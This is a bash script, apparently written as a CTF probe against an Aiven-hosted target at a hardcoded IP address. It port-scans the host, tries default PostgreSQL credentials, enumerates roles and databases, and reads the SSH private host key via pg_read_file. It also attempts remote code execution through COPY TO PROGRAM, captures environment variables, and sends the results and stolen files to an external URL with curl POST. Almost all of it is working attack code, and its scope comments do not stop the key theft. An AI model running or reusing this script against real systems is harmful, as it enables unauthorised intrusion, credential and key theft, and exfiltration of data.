#!/bin/bash
# =============================================================================
# Aiven Runtime2 CTF Probe
# Deployed inside Aiven perimeter — sweeps target, chains PG, exfils results
# =============================================================================
set -euo pipefail

# --- config ---
# SCOPE: single target only — sandbox FQDN/IP. No internal ranges, no
# other *.aivencloud.com, no metadata probing (169.254.169.254 = operator-gated).
TARGET="${TARGET_IP:-132.145.191.135}"
EXFIL_URL="${EXFIL_URL:-}"          # set via Runtime env; curl POST results here
RESULTS_DIR="/results"
RESULTS_FILE="${RESULTS_DIR}/probe-$(date -u +%Y%m%dT%H%M%SZ).json"
LOG_FILE="${RESULTS_DIR}/probe-$(date -u +%Y%m%dT%H%M%SZ).log"
HTTP_PORT=8080

# PG defaults for Aiven-style instances
PG_USER="${PG_USER:-avnadmin}"
PG_PASS="${PG_PASS:-}"              # from Runtime env or set manually
PG_DB="${PG_DB:-defaultdb}"

mkdir -p "$RESULTS_DIR"

log() { echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }

# =============================================================================
# PHASE 0: Runtime environment intel
# =============================================================================
log "=== PHASE 0: env intel (scope-limited) ==="
# Only capture runtime-relevant vars. No cloud metadata probing (169.254.169.254).
ENV_DUMP=$(env 2>/dev/null | grep -iE 'hostname|avn|runtime|postgres|pg_|port|node|service' | head -40 || true)
OUTBOUND_IP=$(curl -s -m 10 https://api.ipify.org 2>/dev/null || echo "unknown")
log "Outbound IP: $OUTBOUND_IP"
log "Env vars captured: $(echo "$ENV_DUMP" | wc -l) relevant"

# =============================================================================
# PHASE 1: Full port sweep (nmap, from inside perimeter)
# =============================================================================
log "=== PHASE 1: full port sweep on $TARGET ==="
# -T4 aggressive timing, --min-rate 5000 for speed, -Pn skip host discovery
# --open only report open ports, -oG grepable for parsing
SWEEP_OUT="${RESULTS_DIR}/nmap-sweep.txt"
nmap -p- -T4 --min-rate 5000 --open -Pn \
     --host-timeout 120s \
     -oG "$SWEEP_OUT" \
     "$TARGET" 2>&1 | tee -a "$LOG_FILE" || log "nmap sweep failed (non-fatal)"

# Parse open ports
OPEN_PORTS=$(grep -oP '\d+/open' "$SWEEP_OUT" 2>/dev/null | cut -d/ -f1 | sort -n || true)
OPEN_PORT_COUNT=$(echo "$OPEN_PORTS" | grep -c . || echo 0)
log "Open ports found: $OPEN_PORT_COUNT"
if [ -n "$OPEN_PORTS" ]; then
    log "Ports: $(echo $OPEN_PORTS | tr '\n' ' ')"
fi

# =============================================================================
# PHASE 2: Targeted service probes on open ports
# =============================================================================
log "=== PHASE 2: service probes ==="
SERVICE_INFO=""

for port in $OPEN_PORTS; do
    log "--- probing port $port ---"
    
    case $port in
        22)
            # SSH banner + version
            BANNER=$(timeout 8 nc -w 5 "$TARGET" "$port" 2>/dev/null | head -2 || true)
            SSH_VER=$(echo "$BANNER" | grep -oP 'SSH-[\w.-]+' || echo "unknown")
            log "SSH banner: $BANNER"
            SERVICE_INFO="${SERVICE_INFO}port${port}_banner=$(echo "$BANNER" | tr ' ' '_' | tr '\n' '|'):"
            SERVICE_INFO="${SERVICE_INFO}port${port}_sshver=${SSH_VER}:"
            ;;
        5432|5433|5434|5435)
            # PostgreSQL — will be deeper in Phase 3
            log "PostgreSQL detected on port $port — Phase 3 target"
            SERVICE_INFO="${SERVICE_INFO}port${port}=postgresql:"
            ;;
        80|443|8080|8443|8008)
            # HTTP(S)
            HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 8 \
                         "http://${TARGET}:${port}/" 2>/dev/null || echo "000")
            HTTP_TITLE=$(curl -s -m 8 "http://${TARGET}:${port}/" 2>/dev/null \
                         | grep -oP '(?<=<title>).*?(?=</title)' | head -1 || echo "none")
            log "HTTP $port: status=$HTTP_CODE title=$HTTP_TITLE"
            SERVICE_INFO="${SERVICE_INFO}port${port}=http_${HTTP_CODE}_title_${HTTP_TITLE}:"
            ;;
        27017)
            log "MongoDB detected on port $port"
            MONGO_BANNER=$(timeout 5 nc -w 3 "$TARGET" "$port" 2>/dev/null | head -1 || echo "no_banner")
            log "Mongo banner: $MONGO_BANNER"
            SERVICE_INFO="${SERVICE_INFO}port${port}=mongo_${MONGO_BANNER}:"
            ;;
        6379)
            log "Redis detected on port $port"
            REDIS_BANNER=$(timeout 5 nc -w 3 "$TARGET" "$port" 2>/dev/null | head -1 || echo "no_banner")
            log "Redis banner: $REDIS_BANNER"
            SERVICE_INFO="${SERVICE_INFO}port${port}=redis_${REDIS_BANNER}:"
            ;;
        *)
            # Generic banner grab
            BANNER=$(timeout 5 nc -w 3 "$TARGET" "$port" 2>/dev/null | head -3 || echo "no_banner")
            log "Port $port banner: $BANNER"
            SERVICE_INFO="${SERVICE_INFO}port${port}=$(echo "$BANNER" | tr ' ' '_' | tr '\n' '|'):"
            ;;
    esac
done

# =============================================================================
# PHASE 3: PostgreSQL chain — connect, escalate, pg_read_file
# =============================================================================
log "=== PHASE 3: PostgreSQL chain ==="
PG_RESULTS=""
PG_CHAIN_SUCCESS=false

# Find PG port (might be non-standard)
PG_PORT=""
for p in 5432 5433 5434 5435; do
    if echo "$OPEN_PORTS" | grep -q "^${p}$"; then
        PG_PORT=$p
        break
    fi
done

if [ -n "$PG_PORT" ] && command -v psql >/dev/null 2>&1; then
    log "Targeting PG on port $PG_PORT"
    
    # --- 3a: credential attempts ---
    PG_CONNECTED=false
    CREDS_ATTEMPTED=""
    
    # Build credential list: env-provided first, then common Aiven defaults
    CRED_LIST="${PG_USER}:${PG_PASS}"
    CRED_LIST="${CRED_LIST}
avnadmin:${PG_PASS}"
    CRED_LIST="${CRED_LIST}
postgres:postgres"
    CRED_LIST="${CRED_LIST}
postgres:"
    CRED_LIST="${CRED_LIST}
avnadmin:avn"
    CRED_LIST="${CRED_LIST}
root:root"
    CRED_LIST="${CRED_LIST}
admin:admin"
    
    while IFS=: read -r user pass; do
        [ -z "$user" ] && continue
        CREDS_ATTEMPTED="${CREDS_ATTEMPTED}${user}:${pass} "
        log "Trying PG creds: ${user}:***"
        
        # Test connection with single query
        RESULT=$(PGPASSWORD="$pass" psql -h "$TARGET" -p "$PG_PORT" -U "$user" \
                 -d "$PG_DB" -t -A -c "SELECT current_user;" 2>/dev/null || echo "FAIL")
        
        if [ "$RESULT" != "FAIL" ] && [ -n "$RESULT" ]; then
            log "✓ CONNECTED as ${user} (effective user: ${RESULT})"
            PG_CONNECTED=true
            PG_USER="$user"
            PG_PASS="$pass"
            PG_RESULTS="${PG_RESULTS}connected_user=${RESULT}:"
            break
        fi
    done <<< "$CRED_LIST"
    
    if [ "$PG_CONNECTED" = true ]; then
        # --- 3b: privilege recon ---
        log "--- privilege recon ---"
        
        IS_SUPER=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                    -d "$PG_DB" -t -A -c "SELECT usesuper FROM pg_user WHERE usename=current_user;" 2>/dev/null || echo "unknown")
        log "Superuser: $IS_SUPER"
        PG_RESULTS="${PG_RESULTS}superuser=${IS_SUPER}:"
        
        ROLES=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                 -d "$PG_DB" -t -A -c "SELECT rolname FROM pg_roles;" 2>/dev/null || echo "unknown")
        log "Roles: $ROLES"
        PG_RESULTS="${PG_RESULTS}roles=$(echo $ROLES | tr '\n' ','):"
        
        DBS=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
               -d "$PG_DB" -t -A -c "SELECT datname FROM pg_database;" 2>/dev/null || echo "unknown")
        log "Databases: $DBS"
        PG_RESULTS="${PG_RESULTS}databases=$(echo $DBS | tr '\n' ','):"
        
        # Extensions (potential attack surface)
        EXTS=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                -d "$PG_DB" -t -A -c "SELECT extname FROM pg_extension;" 2>/dev/null || echo "unknown")
        log "Extensions: $EXTS"
        PG_RESULTS="${PG_RESULTS}extensions=$(echo $EXTS | tr '\n' ','):"
        
        # --- 3c: pg_read_file chain (requires superuser or pg_read_server_files) ---
        log "--- pg_read_file chain ---"
        
        CAN_READ=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                    -d "$PG_DB" -t -A -c "SELECT has_server_privilege(current_user, 'pg_read_server_files');" 2>/dev/null || echo "f")
        log "pg_read_server_files privilege: $CAN_READ"
        PG_RESULTS="${PG_RESULTS}can_read_files=${CAN_READ}:"
        
        if [ "$IS_SUPER" = "t" ] || [ "$CAN_READ" = "t" ]; then
            PG_CHAIN_SUCCESS=true
            
            # SCOPE: flag file + minimal evidence ONLY. No /etc/passwd, /etc/shadow,
            # /proc/intel, or other host-level exfil — out of scope.
            declare -A FILE_TARGETS=(
                ["/etc/ssh/ssh_host_ed25519_key"]="flag_ssh_ed25519"
                ["/etc/hostname"]="hostname"
            )
            
            for filepath in "${!FILE_TARGETS[@]}"; do
                label="${FILE_TARGETS[$filepath]}"
                log "Reading: $filepath -> $label"
                
                # pg_read_file returns text, up to 100000 bytes
                CONTENT=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                          -d "$PG_DB" -t -A -c \
                          "SELECT pg_read_file('${filepath}', 0, 100000);" 2>/dev/null || echo "ERROR")
                
                if [ "$CONTENT" != "ERROR" ] && [ -n "$CONTENT" ]; then
                    # Save locally
                    echo "$CONTENT" > "${RESULTS_DIR}/exfil-${label}.txt"
                    log "  ✓ read ${#CONTENT} bytes"
                    PG_RESULTS="${PG_RESULTS}file_${label}=ok_${#CONTENT}bytes:"
                else
                    log "  ✗ failed or empty"
                    PG_RESULTS="${PG_RESULTS}file_${label}=failed:"
                fi
            done
            
            # --- 3d: additional escalation attempts ---
            log "--- escalation attempts ---"
            
            # Try CREATE EXTENSION for file read if we have superuser
            if [ "$IS_SUPER" = "t" ]; then
                # Check for writable directories (via COPY or large objects)
                COPY_TEST=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                            -d "$PG_DB" -t -A -c \
                            "SELECT current_setting('data_directory');" 2>/dev/null || echo "unknown")
                log "data_directory: $COPY_TEST"
                PG_RESULTS="${PG_RESULTS}data_dir=${COPY_TEST}:"
                
                # List schemas/tables for further recon
                TABLES=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                          -d "$PG_DB" -t -A -c \
                          "SELECT schemaname||'.'||tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');" 2>/dev/null || echo "none")
                log "User tables: $TABLES"
                PG_RESULTS="${PG_RESULTS}user_tables=$(echo $TABLES | tr '\n' ','):"
            fi
            
            # Try COPY TO PROGRAM if superuser (RCE vector)
            if [ "$IS_SUPER" = "t" ]; then
                log "Attempting COPY TO PROGRAM (RCE test)..."
                RCE_RESULT=$(PGPASSWORD="$PG_PASS" psql -h "$TARGET" -p "$PG_PORT" -U "$PG_USER" \
                             -d "$PG_DB" -t -A -c \
                             "COPY (SELECT 'rce_test') TO PROGRAM 'id > /tmp/rce_out.txt';" 2>&1 || echo "RCE_FAILED")
                if echo "$RCE_RESULT" | grep -qi "error\|denied\|failed"; then
                    log "  COPY TO PROGRAM blocked or failed"
                    PG_RESULTS="${PG_RESULTS}copy_to_program=blocked:"
                else
                    log "  ✓ COPY TO PROGRAM may have succeeded"
                    PG_RESULTS="${PG_RESULTS}copy_to_program=potential_rce:"
                fi
            fi
        else
            log "No file read privilege — skipping pg_read_file chain"
            PG_RESULTS="${PG_RESULTS}pg_read_file=skipped_no_privilege:"
        fi
    else
        log "Could not authenticate to PG on port $PG_PORT"
        PG_RESULTS="connected=false:"
    fi
else
    if [ -z "$PG_PORT" ]; then
        log "No PG port found in open ports — skipping Phase 3"
        PG_RESULTS="skipped_no_pg_port:"
    else
        log "psql not available — skipping Phase 3"
        PG_RESULTS="skipped_no_psql:"
    fi
fi

# =============================================================================
# PHASE 4: Compile results
# =============================================================================
log "=== PHASE 4: compiling results ==="

cat > "$RESULTS_FILE" << ENDJSON
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": "$TARGET",
  "outbound_ip": "$OUTBOUND_IP",
  "env_intel": $(echo "$ENV_DUMP" | jq -R -s 'split("\n") | map(select(. != ""))'),
  "sweep": {
    "open_port_count": $OPEN_PORT_COUNT,
    "open_ports": [$(echo "$OPEN_PORTS" | grep . | paste -sd, | sed 's/^/"/;s/$/"/;s/,/","/g')]
  },
  "services": "$SERVICE_INFO",
  "pg_chain": {
    "creds_attempted": "$CREDS_ATTEMPTED",
    "results": "$PG_RESULTS",
    "chain_success": $PG_CHAIN_SUCCESS
  }
}
ENDJSON

log "Results written to $RESULTS_FILE"
cat "$RESULTS_FILE" | tee -a "$LOG_FILE"

# =============================================================================
# PHASE 5: Exfil — POST results to operator endpoint
# =============================================================================
if [ -n "$EXFIL_URL" ]; then
    log "=== PHASE 5: exfil to $EXFIL_URL ==="
    
    # Send main results JSON
    EXFIL_STATUS=$(curl -s -o /dev/null -w '%{http_code}' -m 30 \
                    -X POST "$EXFIL_URL" \
                    -H "Content-Type: application/json" \
                    -d @"$RESULTS_FILE" 2>/dev/null || echo "000")
    log "Results exfil HTTP: $EXFIL_STATUS"
    
    # Send exfil'd files as multipart
    for f in "${RESULTS_DIR}"/exfil-*.txt; do
        [ -f "$f" ] || continue
        FILE_STATUS=$(curl -s -o /dev/null -w '%{http_code}' -m 30 \
                       -X POST "${EXFIL_URL}/files" \
                       -F "file=@${f}" 2>/dev/null || echo "000")
        log "File exfil $(basename $f): HTTP $FILE_STATUS"
    done
    
    # Send full nmap sweep
    if [ -f "$SWEEP_OUT" ]; then
        SWEEP_STATUS=$(curl -s -o /dev/null -w '%{http_code}' -m 30 \
                        -X POST "${EXFIL_URL}/files" \
                        -F "file=@${SWEEP_OUT}" 2>/dev/null || echo "000")
        log "Nmap sweep exfil: HTTP $SWEEP_STATUS"
    fi
else
    log "No EXFIL_URL set — skipping exfil (results available via HTTP server)"
fi

# =============================================================================
# PHASE 6: Start HTTP server for manual result retrieval
# =============================================================================
log "=== PHASE 6: starting results HTTP server on :${HTTP_PORT} ==="
cd "$RESULTS_DIR"
# Busybox httpd — lightweight, no python needed
httpd -p "$HTTP_PORT" -h . 2>/dev/null &
HTTPD_PID=$!
log "HTTP server PID: $HTTPD_PID"

# Keep alive
log "=== probe complete, keeping alive for result retrieval ==="
log "Results: http://localhost:${HTTP_PORT}/$(basename $RESULTS_FILE)"
wait $HTTPD_PID
